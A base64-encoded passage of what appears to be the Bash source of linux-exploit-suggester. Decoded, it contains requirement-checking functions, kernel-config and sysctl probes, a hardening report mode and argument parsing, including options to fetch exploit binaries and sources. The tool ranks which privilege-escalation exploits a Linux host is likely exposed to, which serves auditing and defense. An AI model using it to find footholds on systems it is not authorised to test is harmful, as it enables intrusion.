FibGUgKC1rIG9yIC0tdW5hbWUgb3IgLXAgc2V0KSBvciBpZiB1c2VyIHNhaWQgc28gKC0tc2tpcC1tb3JlLWNoZWNrcykKICAgICAgICBbICIkb3B0X3NraXBfbW9yZV9jaGVja3MiID0gInRydWUiIF0gJiYgcmV0dXJuIDAKCiAgICAgICAgIyBpZiBrZXJuZWwgY29uZmlnIElTIGF2YWlsYWJsZToKICAgICAgICBpZiBbIC1uICIkS0NPTkZJRyIgXTsgdGhlbgogICAgICAgICAgICBpZiAkS0NPTkZJRyB8IGdyZXAgLUUgLXFpICRJTjsgdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIDA7CiAgICAgICAgICAgICMgcmVxdWlyZWQgb3B0aW9uIHdhc24ndCBmb3VuZCwgZXhwbG9pdCBpcyBub3QgYXBwbGljYWJsZQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICByZXR1cm4gMTsKICAgICAgICAgICAgZmkKICAgICAgICAjIGNvbmZpZyBpcyBub3QgYXZhaWxhYmxlCiAgICAgICAgZWxzZQogICAgICAgICAgICByZXR1cm4gMDsKICAgICAgICBmaQogICAgZWxpZiBbWyAiJElOIiA9fiBec3lzY3RsOi4qJCBdXTsgdGhlbgoKICAgICAgICAjIHNraXAgaWYgY2hlY2sgaXMgbm90IGFwcGxpY2FibGUgKC1rIG9yIC0tdW5hbWUgb3IgLXAgbW9kZXMpIG9yIGlmIHVzZXIgc2FpZCBzbyAoLS1za2lwLW1vcmUtY2hlY2tzKQogICAgICAgIFsgIiRvcHRfc2tpcF9tb3JlX2NoZWNrcyIgPSAidHJ1ZSIgXSAmJiByZXR1cm4gMAoKICAgICAgICBzeXNjdGxDb25kaXRpb249IiR7SU46N30iCgogICAgICAgICMgZXh0cmFjdCBzeXNjdGwgZW50cnksIHJlbGF0aW9uIHNpZ24gYW5kIHJlcXVpcmVkIHZhbHVlCiAgICAgICAgaWYgZWNobyAkc3lzY3RsQ29uZGl0aW9uIHwgZ3JlcCAtcWkgIiE9IjsgdGhlbgogICAgICAgICAgICBzaWduPSIhPSIKICAgICAgICBlbGlmIGVjaG8gJHN5c2N0bENvbmRpdGlvbiB8IGdyZXAgLXFpICI9PSI7IHRoZW4KICAgICAgICAgICAgc2lnbj0iPT0iCiAgICAgICAgZWxzZQogICAgICAgICAgICBleGl0V2l0aEVyck1zZyAiV3Jvbmcgc3lzY3RsIGNvbmRpdGlvbi4gVGhlcmUgaXMgc3ludGF4IGVycm9yIGluIHlvdXIgZmVhdHVyZXMgREIuIEFib3J0aW5nLiIKICAgICAgICBmaQogICAgICAgIHZhbD0kKGVjaG8gIiRzeXNjdGxDb25kaXRpb24iIHwgYXdrIC1GICIkc2lnbiIgJ3twcmludCAkMn0nKQogICAgICAgIGVudHJ5PSQoZWNobyAiJHN5c2N0bENvbmRpdGlvbiIgfCBhd2sgLUYgIiRzaWduIiAne3ByaW50ICQxfScpCgogICAgICAgICMgZ2V0IGN1cnJlbnQgc2V0dGluZyBvZiBzeXNjdGwgZW50cnkKICAgICAgICBjdXJWYWw9JCgvc2Jpbi9zeXNjdGwgLWEgMj4gL2Rldi9udWxsIHwgZ3JlcCAiJGVudHJ5IiB8IGF3ayAtRic9JyAne3ByaW50ICQyfScpCgogICAgICAgICMgc3BlY2lhbCBjYXNlIGZvciAtLWNoZWNrc2VjIG1vZGU6IHJldHVybiAyIGlmIHRoZXJlIGlzIG5vIHN1Y2ggc3dpdGNoIGluIHN5c2N0bAogICAgICAgIFsgLXogIiRjdXJWYWwiIC1hICIkb3B0X2NoZWNrc2VjX21vZGUiID0gInRydWUiIF0gJiYgcmV0dXJuIDIKCiAgICAgICAgIyBmb3Igb3RoZXIgbW9kZXM6IHNraXAgaWYgdGhlcmUgaXMgbm8gc3VjaCBzd2l0Y2ggaW4gc3lzY3RsCiAgICAgICAgWyAteiAiJGN1clZhbCIgXSAmJiByZXR1cm4gMAoKICAgICAgICAjIGNvbXBhcmUgJiByZXR1cm4gcmVzdWx0CiAgICAgICAgY29tcGFyZVZhbHVlcyAkY3VyVmFsICR2YWwgJHNpZ24gJiYgcmV0dXJuIDAKCiAgICBlbGlmIFtbICIkSU4iID1+IF5jbWQ6LiokIF1dOyB0aGVuCgogICAgICAgICMgc2tpcCBpZiBjaGVjayBpcyBub3QgYXBwbGljYWJsZSAoLWsgb3IgLS11bmFtZSBvciAtcCBtb2Rlcykgb3IgaWYgdXNlciBzYWlkIHNvICgtLXNraXAtbW9yZS1jaGVja3MpCiAgICAgICAgWyAiJG9wdF9za2lwX21vcmVfY2hlY2tzIiA9ICJ0cnVlIiBdICYmIHJldHVybiAwCgogICAgICAgIGNtZD0iJHtJTjo0fSIKICAgICAgICBpZiBldmFsICIke2NtZH0iOyB0aGVuCiAgICAgICAgICAgIHJldHVybiAwCiAgICAgICAgZmkKICAgIGZpCgogICAgcmV0dXJuIDEKfQoKZ2V0S2VybmVsQ29uZmlnKCkgewoKICAgIGlmIFsgLWYgL3Byb2MvY29uZmlnLmd6IF0gOyB0aGVuCiAgICAgICAgS0NPTkZJRz0iemNhdCAvcHJvYy9jb25maWcuZ3oiCiAgICBlbGlmIFsgLWYgL2Jvb3QvY29uZmlnLWB1bmFtZSAtcmAgXSA7IHRoZW4KICAgICAgICBLQ09ORklHPSJjYXQgL2Jvb3QvY29uZmlnLWB1bmFtZSAtcmAiCiAgICBlbGlmIFsgLWYgIiR7S0JVSUxEX09VVFBVVDotL3Vzci9zcmMvbGludXh9Ii8uY29uZmlnIF0gOyB0aGVuCiAgICAgICAgS0NPTkZJRz0iY2F0ICR7S0JVSUxEX09VVFBVVDotL3Vzci9zcmMvbGludXh9Ly5jb25maWciCiAgICBlbHNlCiAgICAgICAgS0NPTkZJRz0iIgogICAgZmkKfQoKY2hlY2tzZWNNb2RlKCkgewoKICAgIE1PREU9MAoKICAgICMgc3RhcnQgYW5hbHlzaXMKZm9yIEZFQVRVUkUgaW4gIiR7RkVBVFVSRVNbQF19IjsgZG8KCiAgICAjIGNyZWF0ZSBhcnJheSBmcm9tIGN1cnJlbnQgZXhwbG9pdCBoZXJlIGRvYyBhbmQgZmV0Y2ggbmVlZGVkIGxpbmVzCiAgICBpPTAKICAgICMgKCctcicgaXMgdXNlZCB0byBub3QgaW50ZXJwcmV0IGJhY2tzbGFzaCB1c2VkIGZvciBiYXNoIGNvbG9ycykKICAgIHdoaWxlIHJlYWQgLXIgbGluZQogICAgZG8KICAgICAgICBhcnJbaV09IiRsaW5lIgogICAgICAgIGk9JCgoaSArIDEpKQogICAgZG9uZSA8PDwgIiRGRUFUVVJFIgoKCSMgbW9kZXM6IGtlcm5lbC1mZWF0dXJlICgxKSB8IGh3LWZlYXR1cmUgKDIpIHwgM3JkcGFydHktZmVhdHVyZSAoMykgfCBhdHRhY2stc3VyZmFjZSAoNCkKICAgIE5BTUU9IiR7YXJyWzBdfSIKICAgIFBSRV9OQU1FPSIke05BTUU6MDo4fSIKICAgIE5BTUU9IiR7TkFNRTo5fSIKICAgIGlmIFsgIiR7UFJFX05BTUV9IiA9ICJzZWN0aW9uOiIgXTsgdGhlbgoJCSMgYWR2YW5jZSB0byBuZXh0IE1PREUKCQlNT0RFPSQoKCRNT0RFICsgMSkpCgogICAgICAgIGVjaG8KICAgICAgICBlY2hvIC1lICIke2JsZHdodH0ke05BTUV9JHt0eHRyc3R9IgogICAgICAgIGVjaG8KICAgICAgICBjb250aW51ZQogICAgZmkKCiAgICBBVkFJTEFCTEU9IiR7YXJyWzFdfSIgJiYgQVZBSUxBQkxFPSIke0FWQUlMQUJMRToxMX0iCiAgICBFTkFCTEU9JChlY2hvICIkRkVBVFVSRSIgfCBncmVwICJlbmFibGVkOiAiIHwgYXdrIC1GJ2VkOiAnICd7cHJpbnQgJDJ9JykKICAgIGFuYWx5c2lzX3VybD0kKGVjaG8gIiRGRUFUVVJFIiB8IGdyZXAgImFuYWx5c2lzLXVybDogIiB8IGF3ayAne3ByaW50ICQyfScpCgogICAgIyBzcGxpdCBsaW5lIHdpdGggYXZhaWxhYmlsaXR5IHJlcXVpcmVtZW50cyAmIGxvb3AgdGhydSBhbGwgYXZhaWxhYmlsaXR5IHJlcXMgb25lIGJ5IG9uZSAmIGNoZWNrIHdoZXRoZXIgaXQgaXMgbWV0CiAgICBJRlM9JywnIHJlYWQgLXIgLWEgYXJyYXkgPDw8ICIkQVZBSUxBQkxFIgogICAgQVZBSUxBQkxFX1JFUVNfTlVNPSR7I2FycmF5W0BdfQogICAgQVZBSUxBQkxFX1BBU1NFRF9SRVE9MAoJQ09ORklHPSIiCiAgICBmb3IgUkVRIGluICIke2FycmF5W0BdfSI7IGRvCgoJCSMgZmluZCBDT05GSUdfIG5hbWUgKGlmIHByZXNlbnQpIGZvciBjdXJyZW50IGZlYXR1cmUgKG9ubHkgZm9yIGRpc3BsYXkgcHVycG9zZXMpCgkJaWYgWyAteiAiJENPTkZJRyIgXTsgdGhlbgoJCQljb25maWc9JChlY2hvICIkUkVRIiB8IGdyZXAgIkNPTkZJR18iKQoJCQlbIC1uICIkY29uZmlnIiBdICYmIENPTkZJRz0iKCQoZWNobyAkUkVRIHwgY3V0IC1kJz0nIC1mMSkpIgoJCWZpCgogICAgICAgIGlmIChjaGVja1JlcXVpcmVtZW50ICIkUkVRIik7IHRoZW4KICAgICAgICAgICAgQVZBSUxBQkxFX1BBU1NFRF9SRVE9JCgoJEFWQUlMQUJMRV9QQVNTRURfUkVRICsgMSkpCiAgICAgICAgZWxzZQogICAgICAgICAgICBicmVhawogICAgICAgIGZpCiAgICBkb25lCgogICAgIyBzcGxpdCBsaW5lIHdpdGggZW5hYmxlbWVudCByZXF1aXJlbWVudHMgJiBsb29wIHRocnUgYWxsIGVuYWJsZW1lbnQgcmVxcyBvbmUgYnkgb25lICYgY2hlY2sgd2hldGhlciBpdCBpcyBtZXQKICAgIEVOQUJMRV9QQVNTRURfUkVRPTAKICAgIEVOQUJMRV9SRVFTX05VTT0wCiAgICBub1N5c2N0bD0wCiAgICBpZiBbIC1uICIkRU5BQkxFIiBdOyB0aGVuCiAgICAgICAgSUZTPScsJyByZWFkIC1yIC1hIGFycmF5IDw8PCAiJEVOQUJMRSIKICAgICAgICBFTkFCTEVfUkVRU19OVU09JHsjYXJyYXlbQF19CiAgICAgICAgZm9yIFJFUSBpbiAiJHthcnJheVtAXX0iOyBkbwogICAgICAgICAgICBjbWRTdGRvdXQ9JChjaGVja1JlcXVpcmVtZW50ICIkUkVRIikKICAgICAgICAgICAgcmV0VmFsPSQ/CiAgICAgICAgICAgIGlmIFsgJHJldFZhbCAtZXEgMCBdOyB0aGVuCiAgICAgICAgICAgICAgICBFTkFCTEVfUEFTU0VEX1JFUT0kKCgkRU5BQkxFX1BBU1NFRF9SRVEgKyAxKSkKICAgICAgICAgICAgZWxpZiBbICRyZXRWYWwgLWVxIDIgXTsgdGhlbgogICAgICAgICAgICAjIHNwZWNpYWwgY2FzZTogc3lzY3RsIGVudHJ5IGlzIG5vdCBwcmVzZW50IG9uIGdpdmVuIHN5c3RlbTogc2lnbmFsIGl0IGFzOiBOL0EKICAgICAgICAgICAgICAgIG5vU3lzY3RsPTEKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGZpCiAgICAgICAgZG9uZQogICAgZmkKCiAgICBmZWF0dXJlPSQoZWNobyAiJEZFQVRVUkUiIHwgZ3JlcCAiZmVhdHVyZTogIiB8IGN1dCAtZCcgJyAtZiAyLSkKCiAgICBpZiBbIC1uICIkY21kU3Rkb3V0IiBdOyB0aGVuCiAgICAgICAgaWYgWyAkY21kU3Rkb3V0IC1lcSAwIF07IHRoZW4KICAgICAgICAgICAgc3RhdGU9IlsgJHt0eHRyZWR9U2V0IHRvICRjbWRTdGRvdXQke3R4dHJzdH0gXSIKCQkJY21kU3Rkb3V0PSIiCiAgICAgICAgZWxzZQogICAgICAgICAgICBzdGF0ZT0iWyAke3R4dGdybn1TZXQgdG8gJGNtZFN0ZG91dCR7dHh0cnN0fSBdIgoJCQljbWRTdGRvdXQ9IiIKICAgICAgICBmaQogICAgZWxzZQoKCXVua25vd249IlsgJHt0eHRncmF5fVVua25vd24ke3R4dHJzdH0gIF0iCgoJIyBmb3IgM3JkIHBhcnR5ICgzKSBtb2RlIGRpc3BsYXkgIk4vQSIgb3IgIkVuYWJsZWQiCglpZiBbICRNT0RFIC1lcSAzIF07IHRoZW4KICAgICAgICAgICAgZW5hYmxlZD0iWyAke3R4dGdybn1FbmFibGVkJHt0eHRyc3R9ICAgXSIKICAgICAgICAgICAgZGlzYWJsZWQ9IlsgICAke3R4dGdyYXl9Ti9BJHt0eHRyc3R9ICAgIF0iCgogICAgICAgICMgZm9yIGF0dGFjay1zdXJmYWNlICg0KSBtb2RlIGRpc3BsYXkgIkxvY2tlZCIgb3IgIkV4cG9zZWQiCiAgICAgICAgZWxpZiBbICRNT0RFIC1lcSA0IF07IHRoZW4KICAgICAgICAgICBlbmFibGVkPSJbICR7dHh0cmVkfUV4cG9zZWQke3R4dHJzdH0gIF0iCiAgICAgICAgICAgZGlzYWJsZWQ9IlsgJHt0eHRncm59TG9ja2VkJHt0eHRyc3R9ICAgXSIKCgkjIG90aGVyIG1vZGVzIiAiRGlzYWJsZWQiIC8gIkVuYWJsZWQiCgllbHNlCgkJZW5hYmxlZD0iWyAke3R4dGdybn1FbmFibGVkJHt0eHRyc3R9ICBdIgoJCWRpc2FibGVkPSJbICR7dHh0cmVkfURpc2FibGVkJHt0eHRyc3R9IF0iCglmaQoKCWlmIFsgLXogIiRLQ09ORklHIiAtYSAiJEVOQUJMRV9SRVFTX05VTSIgPSAwIF07IHRoZW4KCSAgICBzdGF0ZT0kdW5rbm93bgogICAgZWxpZiBbICRBVkFJTEFCTEVfUEFTU0VEX1JFUSAtZXEgJEFWQUlMQUJMRV9SRVFTX05VTSAtYSAkRU5BQkxFX1BBU1NFRF9SRVEgLWVxICRFTkFCTEVfUkVRU19OVU0gXTsgdGhlbgogICAgICAgIHN0YXRlPSRlbmFibGVkCiAgICBlbHNlCiAgICAgICAgc3RhdGU9JGRpc2FibGVkCglmaQoKICAgIGZpCgogICAgZWNobyAtZSAiICRzdGF0ZSAkZmVhdHVyZSAke3dodH0ke0NPTkZJR30ke3R4dHJzdH0iCiAgICBbIC1uICIkYW5hbHlzaXNfdXJsIiBdICYmIGVjaG8gLWUgIiAgICAgICAgICAgICAgJGFuYWx5c2lzX3VybCIKICAgIGVjaG8KCmRvbmUKCn0KCmRpc3BsYXlFeHBvc3VyZSgpIHsKICAgIFJBTks9JDEKCiAgICBpZiBbICIkUkFOSyIgLWdlIDYgXTsgdGhlbgogICAgICAgIGVjaG8gImhpZ2hseSBwcm9iYWJsZSIKICAgIGVsaWYgWyAiJFJBTksiIC1nZSAzIF07IHRoZW4KICAgICAgICBlY2hvICJwcm9iYWJsZSIKICAgIGVsc2UKICAgICAgICBlY2hvICJsZXNzIHByb2JhYmxlIgogICAgZmkKfQoKIyBwYXJzZSBjb21tYW5kIGxpbmUgcGFyYW1ldGVycwpBUkdTPSQoZ2V0b3B0IC0tb3B0aW9ucyAkU0hPUlRPUFRTICAtLWxvbmdvcHRpb25zICRMT05HT1BUUyAtLSAiJEAiKQpbICQ/ICE9IDAgXSAmJiBleGl0V2l0aEVyck1zZyAiQWJvcnRpbmcuIgoKZXZhbCBzZXQgLS0gIiRBUkdTIgoKd2hpbGUgdHJ1ZTsgZG8KICAgIGNhc2UgIiQxIiBpbgogICAgICAgIC11fC0tdW5hbWUpCiAgICAgICAgICAgIHNoaWZ0CiAgICAgICAgICAgIFVOQU1FX0E9IiQxIgogICAgICAgICAgICBvcHRfdW5hbWVfc3RyaW5nPXRydWUKICAgICAgICAgICAgOzsKICAgICAgICAtVnwtLXZlcnNpb24pCiAgICAgICAgICAgIHZlcnNpb24KICAgICAgICAgICAgZXhpdCAwCiAgICAgICAgICAgIDs7CiAgICAgICAgLWh8LS1oZWxwKQogICAgICAgICAgICB1c2FnZSAKICAgICAgICAgICAgZXhpdCAwCiAgICAgICAgICAgIDs7CiAgICAgICAgLWZ8LS1mdWxsKQogICAgICAgICAgICBvcHRfZnVsbD10cnVlCiAgICAgICAgICAgIDs7CiAgICAgICAgLWd8LS1zaG9ydCkKICAgICAgICAgICAgb3B0X3N1bW1hcnk9dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC1ifC0tZmV0Y2gtYmluYXJpZXMpCiAgICAgICAgICAgIG9wdF9mZXRjaF9iaW5zPXRydWUKICAgICAgICAgICAgOzsKICAgICAgICAtc3wtLWZldGNoLXNvdXJjZXMpCiAgICAgICAgICAgIG9wdF9mZXRjaF9zcmNzPXRydWUKICAgICAgICAgICAgOzsKICAgICAgICAta3wtLWtlcm5lbCkKICAgICAgICAgICAgc2hpZnQKICAgICAgICAgICAgS0VSTkVMPSIkMSIKICAgICAgICAgICAgb3B0X2tlcm5lbF92ZXJzaW9uPXRydWUKICAgICAgICAgICAgOzsKICAgICAgICAtZHwtLXNob3ctZG9zKQogICAgICAgICAgICBvcHRfc2hvd19kb3M9dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC1wfC0tcGtnbGlzdC1maWxlKQogICAgICAgICAgICBzaGlmdAogICAgICAgICAgICBQS0dMSVNUX0ZJTEU9IiQxIgogICAgICAgICAgICBvcHRfcGtnbGlzdF9maWxlPXRydWUKICAgICAgICAgICAgOzsKICAgICAgICAtLWN2ZWxpc3QtZmlsZSkKICAgICAgICAgICAgc2hpZnQKICAgICAgICAgICAgQ1ZFTElTVF9GSUxFPSIkMSIKICAgICAgICAgICAgb3B0X2N2ZWxpc3RfZmlsZT10cnVlCiAgICAgICAgICAgIDs7CiAgICAgICAgLS1jaGVja3NlYykKICAgICAgICAgICAgb3B0X2NoZWNrc2VjX21vZGU9dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC0ta2VybmVsc3BhY2Utb25seSkKICAgICAgICAgICAgb3B0X2tlcm5lbF9vbmx5PXRydWUKICAgICAgICAgICAgOzsKICAgICAgICAtLXVzZXJzcGFjZS1vbmx5KQogICAgICAgICAgICBvcHRfdXNlcnNwYWNlX29ubHk9dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC0tc2tpcC1tb3JlLWNoZWNrcykKICAgICAgICAgICAgb3B0X3NraXBfbW9yZV9jaGVja3M9dHJ1ZQogICAgICAgICAgICA7OwogICAgICAgIC0tc2tpcC1wa2ctdmVyc2lvbnMpCiAgICAgICAgICAgIG9wdF9za2lwX3BrZ192ZXJzaW9ucz10cnVlCiAgICAgICAgICAgIDs7CiAgICAgICAgKikKICAgICAgICAgICAgc2hpZnQKICAgICAgICAgICAgaWYgWyAiJCMiICE9ICIwIiBdOyB0aGVuCiAgICAgICAgICAgICAgICBleGl0V2l0aEVyck1zZyAiVW5rbm93biBvcHRpb24gJyQxJy4gQWJvcnRpbmcuIgogICAgICAgICAgICBmaQogICAgICAgICAgICBicmVhawogICAgICAgICAgICA7OwogICAgZXNhYwogICAgc2hpZnQKZG9uZQoKIyBjaGVjayBCYXNoIHZlcnNpb24gKGFzc29jaWF0aXZlIGFycmF5cyBuZWVkIEJhc2ggaW4gdmVyc2lvbiA0LjArKQppZiAoKEJBU0hfVkVSU0lORk9bMF0gPCA0KSk7IHRoZW4KICAgIGV4aXRXaXRoRXJyTXNnICJTY3JpcHQgbmVlZHMgQmFzaCBpbiB2ZXJzaW9uIDQuMCBvciBuZXdlci4gQWJvcnRpbmcuIgpmaQoKIyBleGl0IGlmIGJvdGggLS1rZXJuZWwgYW5kIC0tdW5hbWUgYXJlIHNldApbICIkb3B0X2tlcm5lbF92ZXJzaW9uIiA9ICJ0cnVlIiBdICYmIFsgJG9wdF91bmFtZV9zdHJpbmcgPSAidHJ1ZSIgXSAmJiBleGl0V2l0aEVyck1zZyAiU3dpdGNoZXMgLXV8LS11bmFtZSBhbmQgLWt8LS1rZXJuZWwgYXJlIG11dHVhbGx5IGV4Y2x1c2l2ZS4gQWJvcnRpbmcuIgoKIyBleGl0IGlmIGJvdGggLS1mdWxsIGFuZCAtLXNob3J0IGFyZSBzZXQKWyAiJG9wdF9mdWxsIiA9ICJ0cnVlIiBdICYmIFsgJG9wdF9zdW1tYXJ5ID0gInRydWUiIF0gJiYgZXhpdFdpdGhFcnJNc2cgIlN3aXRjaGVzIC1mfC0tZnVsbCBhbmQgLWd8LS1zaG9ydCBhcmUgbXV0dWFsbHkgZXhjbHVzaXZlLiBBYm9ydGluZy4iCgojIC0tY3ZlbGlzdC1maWxlIG1vZGUgaXMgc3RhbmRhbG9uZSBtb2RlIGFuZCBpcyBub3QgYXBwbGljYWJsZSB3aGVuIG9uZSBvZiAtayB8IC11IHwgLXAgfCAtLWNoZWNrc2VjIHN3aXRjaGVzIGFyZSBzZXQKaWYgWyAiJG9wdF9jdmVsaXN0X2ZpbGUiID0gInRydWUiIF07IHRoZW4KICAgIFsgISAtZSAiJENWRUxJU1RfRklMRSIgXSAmJiBleGl0V2l0aEVyck1zZyAiUHJvdmlkZWQgQ1ZFIGxpc3QgZmlsZSBkb2VzIG5vdCBleGlzdHMuIEFib3J0aW5nLiIKICAgIFsgIiRvcHRfa2VybmVsX3ZlcnNpb24iID0gInRydWUiIF0gJiYgZXhpdFdpdGhFcnJNc2cgIlN3aXRjaGVzIC1rfC0ta2VybmVsIGFuZCAtLWN2ZWxpc3QtZmlsZSBhcmUgbXV0dWFsbHkgZXhjbHVzaXZlLiBBYm9ydGluZy4iCiAgICBbICIkb3B0X3VuYW1lX3N0cmluZyIgPSAidHJ1ZSIgXSAmJiBleGl0V2l0aEVyck1zZyAiU3dpdGNoZXMgLXV8LS11bmFtZSBhbmQgLS1jdmVsaXN0LWZpbGUgYXJlIG11dHVhbGx5IGV4Y2x1c2l2ZS4gQWJvcnRpbmcuIgogICAgWyAiJG9wdF9wa2dsaXN0X2ZpbGUiID0gInRydWUiIF0gJiYgZXhpdFdpdGhFcnJNc2cgIlN3aXRjaGVzIC1wfC0tcGtnbGlzdC1maWxlIGFuZCAtLWN2ZWxpc3QtZmlsZSBhcmUgbXV0dWFsbHkgZXhjbHVzaXZlLiBBYm9ydGluZy4iCmZpCgojIC0tY2hlY2tzZWMgbW9kZSBpcyBzdGFuZGFsb25lIG1vZGUgYW5kIGlzIG5vdCBhcHBsaWNhYmxlIHdoZW4gb25lIG9mIC1rIHwgLXUgfCAtcCB8IC0tY3ZlbGlzdC1maWxlIHN3aXRjaGVzIGFyZSBzZXQKaWYgWyAiJG9wdF9jaGVja3NlY19tb2RlIiA9ICJ0cnVlIiBdOyB0aGVuCiAgICBbICIkb3B0X2tlcm5lbF92ZXJzaW9uIiA9ICJ0cnVlIiBdICYmIGV4aXRXaXRoRXJyTXNnICJTd2l0Y2hlcyAta3wtLWtlcm5lbCBhbmQgLS1jaGVja3NlYyBhcmUgbXV0dWFsbHkgZXhjbHVzaXZlLiBBYm9ydGluZy4iCiAgICBbICIkb3B0X3VuYW1lX3N0cmluZyIgPSAidHJ1ZSIgXSAmJiBleGl0V2l0aEVyck1zZyAiU3dpdGNoZXMgLXV8LS11bmFtZSBhbmQgLS1jaGVja3NlYyBhcmUgbXV0dWFsbHkgZXhjbHVzaXZlLiBBYm9ydGluZy4iCiAgICBbICIkb3B0X3BrZ2xpc3RfZmlsZSIgPSAidHJ1ZSIgXSAmJiBleGl0V2l0aEVyck1zZyAiU3dpdGNoZXMgLXB8LS1wa2dsaXN0LWZpbGUgYW5kIC0tY2hlY2tzZWMgYXJlIG11dHVhbGx5IGV4Y2x1c2l2ZS4gQWJvcnRpbmcuIgpmaQoKIyBleHRyYWN0IGtlcm5lbCB2ZXJzaW9uIGFuZCBvdGhlciBPUyBpbmZvIGxpa2UgZGlzdHJvIG5hbWUsIGRpc3RybyB2ZXJzaW9uLCBldGMuIDMgcG9zc2liaWxpdGllcyBoZXJlOgojIGNhc2UgMTogLS1rZXJuZWwgc2V0CmlmIFsgIiRvcHRfa2VybmVsX3ZlcnNpb24iID09ICJ0cnVlIiBdOyB0aGVuCiAgICAjIFRPRE86IGFkZCBrZXJuZWwgdmVyc2lvbiBudW1iZXIgdmFsaWRhdGlvbgogICAgWyAteiAiJEtFUk5FTCIgXSAmJiBleGl0V2l0aEVyck1zZyAiVW5yZWNvZ25pemVkIGtlcm5lbCB2ZXJzaW9uIGdpdmVuLiBBYm9ydGluZy4iCiAgICBBUkNIPSIiCiAgICBPUz0iIgoKICAgICMgZG8gbm90IHBlcmZvcm0gYWRkaXRpb25hbCBjaGVja3Mgb24gY3VycmVudCBtYWNoaW5lCiAgICBvcHRfc2tpcF9tb3JlX2NoZWNrcz10cnVlCgogICAgIyBkbyBub3QgY29uc2lkZXIgY3VycmVudCBPUwogICAgZ2V0UGtnTGlzdCAiIiAiJFBLR0xJU1RfRklMRSIKCiMgY2FzZSAyOiAtLXVuYW1lIHNldAplbGlmIFsgIiRvcHRfdW5hbWVfc3RyaW5nIiA9PSAidHJ1ZSIgXTsgdGhlbgogICAgWyAteiAiJFVOQU1FX0EiIF0gJiYgZXhpdFdpdGhFcnJNc2cgInVuYW1lIHN0cmluZyBlbXB0eS4gQWJvcnRpbmcuIgogICAgcGFyc2VVbmFtZSAiJFVOQU1FX0EiCgogICAgIyBkbyBub3QgcGVyZm9ybSBhZGRpdGlvbmFsIGNoZWNrcyBvbiBjdXJyZW50IG1hY2hpbmUKICAgIG9wdF9za2lwX21vcmVfY2hlY2tzPXRydWUKCiAgICAjIGRvIG5vdCBjb25zaWRlciBjdXJyZW50IE9TCiAgICBnZXRQa2dMaXN0ICIiICIkUEtHTElTVF9GSUxFIgoKIyBjYXNlIDM6IC0tY3ZlbGlzdC1maWxlIG1vZGUKZWxpZiBbICIkb3B0X2N2ZWxpc3RfZmlsZSIgPSAidHJ1ZSIgXTsgdGhlbgoKICAgICMgZ2V0IGtlcm5lbCBjb25maWd1cmF0aW9uIGluIHRoaXMgbW9kZQogICAgWyAiJG9wdF9za2lwX21vcmVfY2hlY2tzIiA9ICJmYWxzZSIgXSAmJiBnZXRLZXJuZWxDb25maWcKCiMgY2FzZSA0OiAtLWNoZWNrc2VjIG1vZGUKZWxpZiBbICIkb3B0X2NoZWNrc2VjX21vZGUiID0gInRydWUiIF07IHRoZW4KCiAgICAjIHRoaXMgc3dpdGNoIGlzIG5vdCBhcHBsaWNhYmxlIGluIHRoaXMgbW9kZQogICAgb3B0X3NraXBfbW9yZV9jaGVja3M9ZmFsc2UKCiAgICAjIGdldCBrZXJuZWwgY29uZmlndXJhdGlvbiBpbiB0aGlzIG1vZGUKICAgIGdldEtlcm5lbENvbmZpZwogICAgWyAteiAiJEtDT05GSUciIF0gJiYgZWNobyAiV0FSTklORy4gS2VybmVsIENvbmZpZyBub3QgZm91bmQgb24gdGhlIHN5c3RlbSByZXN1bHRzIHdvbid0IGJlIGNvbXBsZXRlLiIKCiAgICAjIGxhdW5jaCBjaGVja3NlYyBtb2RlCiAgICBjaGVja3NlY01vZGUKCiAgICBleGl0IDAKCiMgY2FzZSA1OiBubyAtLXVuYW1lIHwgLS1rZXJuZWwgfCAtLWN2ZWxpc3QtZmlsZSB8IC0tY2hlY2tzZWMgc2V0CmVsc2UKCiAgICAjIC0tcGtnbGlzdC1maWxlIE5PVCBwcm92aWRlZDogdGFrZSBhbGwgaW5mbyBmcm9tIGN1cnJlbnQgbWFjaGluZQogICAgIyBjYXNlIGZvciB2YW5pbGxhIGV4ZWN1dGlvbjogLi9saW51eC1leHBsb2l0LXN1Z2dlc3Rlci5zaAogICAgaWYgWyAiJG9wdF9wa2dsaXN0X2ZpbGUiID09ICJmYWxzZSIgXTsgdGhlbgogICAgICAgIFVOQU1FX0E9JCh1bmFtZSAtYSkKICAgICAgICBbIC16ICIkVU5BTUVfQSIgXSAmJiBleGl0V2l0aEVyck1zZyAidW5hbWUgc3RyaW5nIGVtcHR5LiBBYm9ydGluZy4iCiAgICAgICAgcGFyc2VVbmFtZSAiJFVOQU1FX0EiCgogICAgICAgICMgZ2V0IGtlcm5lbCBjb25maWd1cmF0aW9uIGluIHRoaXMgbW9kZQogICAgICAgIFsgIiRvcHRfc2tpcF9tb3JlX2NoZWNrcyIgPSAiZmFsc2UiIF0gJiYgZ2V0S2VybmVsQ29uZmlnCgogICAgICAgICMgZXh0cmFjdCBkaXN0cmlidXRpb24gdmVyc2lvbiBmcm9tIC9ldGMvb3MtcmVsZWFzZSBPUiAvZXRjL2xzYi1yZWxlYXNlCiAgICAgICAgWyAtbiAiJE9TIiAtYSAiJG9wdF9za2lwX21vcmVfY2hlY2tzIiA9ICJmYWxzZSIgXSAmJiBESVNUUk89JChncmVwIC1zIC1FICdeRElTVFJJQl9SRUxFQVNFPXxeVkVSU0lPTl9JRD0nIC9ldGMvKi1yZWxlYXNlIHwgY3V0IC1kJz0nIC1mMiB8IGhlYWQgLTEgfCB0ciAtZCAnIicpCgogICAgICAgICMgZXh0cmFjdCBwYWNrYWdlIGxpc3RpbmcgZnJvbSBjdXJyZW50IE9TCiAgICAgICAgZ2V0UGtnTGlzdCAiJE9TIiAiIgoKICAgICMgLS1wa2dsaXN0LWZpbGUgcHJvdmlkZWQ6IG9ubHkgY29uc2lkZXIgdXNlcnNwYWNlIGV4cGxvaXRzIGFnYWluc3QgcHJvdmlkZWQgcGFja2FnZSBsaXN0aW5nCiAgICBlbHNlCiAgICAgICAgS0VSTkVMPSIiCiAgICAgICAgI1RPRE86IGV4dHJhY3QgbWFjaGluZSBhcmNoIGZyb20gcGFja2FnZSBsaXN0aW5nCiAgICAgICAgQVJDS